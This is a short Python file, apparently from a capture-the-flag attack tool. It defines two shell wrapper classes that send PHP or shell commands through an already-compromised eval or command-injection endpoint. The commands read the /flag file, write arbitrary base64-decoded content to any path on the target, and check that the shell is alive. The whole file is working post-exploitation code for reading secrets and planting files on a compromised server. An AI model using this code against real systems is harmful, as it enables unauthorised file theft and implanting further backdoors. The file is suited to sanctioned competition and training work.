import re,base64
    
class EvalShellBase():
    pass
    def getflag(self):
        text =  self.run('echo "pops[";readfile("/flag");echo "]";')
        return re.search('pops\[(.*?)\]',text).group(1)
    def write(self,path,content):
        text = self.run('''
        if(file_put_contents('path',base64_decode('shell_content'))){
            print('pops success');
        }
        '''.replace('path',path).replace('shell_content',base64.b64encode(content.encode()).decode()))
        if 'pops success' in text:
            return True
        return False

    def status(self):
        if 'pops.ink' in self.run('print("pops.ink");'):
            return True
        return False


class SystemShellBase():
    pass

    def getflag(self):
        text = self.run('echo "pops[";cat /flag;echo "]"')
        return re.search('pops\[(.*?)\]',text).group(1)

    def write(self,path,content):
        text = self.run('''echo "shell_content"|base64 -d>path&&echo "pops success"'''.replace('path',path).replace('shell_content',base64.b64encode(content.encode()).decode()))
        if 'pops success' in text:
            return True
        return False

    def status(self):
        if 'pops.ink' in self.run('echo "pops.ink"'):
            return True
        return False